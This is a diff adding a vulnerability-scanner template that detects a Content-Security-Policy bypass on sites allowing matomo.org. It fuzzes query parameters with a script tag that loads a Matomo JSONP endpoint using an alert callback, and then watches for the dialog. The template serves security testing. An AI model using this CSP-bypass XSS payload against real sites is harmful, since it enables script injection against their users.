@@ -1,0 +1,55 @@
+id: matomo-demo-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Matomo Demo
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,matomo-demo,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "matomo.org"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: matomo_demo_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://demo.matomo.cloud/?module=API&method=Overlay.getTranslations&idSite=1&format=JSON&callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "matomo_demo_csp_xss == true"
+# digest: 490a0046304402206ed0a3500477e1b83f648bbef66aae3e447fb818d1290e3fc16520ee3b8d164402202049975f28a3a927d0574bc837f2756e7c9c4c9b5f8d0cd230e33833db21c28b:922c64590222798bb761d5b6d8e72950
